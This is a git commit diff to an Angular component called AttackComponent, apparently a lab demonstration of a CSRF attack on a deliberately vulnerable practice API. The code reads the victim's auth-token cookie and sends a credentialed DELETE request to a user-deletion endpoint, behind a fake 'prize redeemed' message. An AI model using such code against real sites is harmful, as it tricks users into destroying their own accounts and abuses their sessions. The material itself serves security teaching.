1fb1dddbe937819781c62554e8e6a1fbf221939b
luzivangois <luzivangois@outlook.com>
2025-02-06 23:05:52 -0300

    modificacoes recentes

--- src/app/attack/attack.component.ts
+++ src/app/attack/attack.component.ts
@@ -10,34 +10,22 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    const token = this.getJwtToken();
-    const headers = new HttpHeaders().set('Authorization', 'Bearer ' + token);
+    const token = this.getCookie("auth-token");
+    const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
   
     this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
-      headers
+      headers,
+      withCredentials: true
     }).subscribe({
       next: () => alert('Prêmio resgatado com sucesso!'),
       error: (err) => console.error('Erro no ataque CSRF:', err)
     });
 }
 
-// getCookie(name: string): string | null {
-//   const value = `; ${document.cookie}`;
-//   console.log(value);
-//   const parts = value.split(`; ${name}=`);
-//   if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
-//   return null;
-//   }
-  getJwtToken(): string | null {
-    const name = 'auth-token';
-    const decodedCookie = decodeURIComponent(document.cookie);
-    const ca = decodedCookie.split(';');
-    for (let i = 0; i < ca.length; i++) {
-      let c = ca[i].trim();
-      if (c.indexOf(name) === 0) {
-        return c.substring(name.length, c.length);
-      }
-    }
+  getCookie(name: string): string | null {
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
     return null;
   }
 }
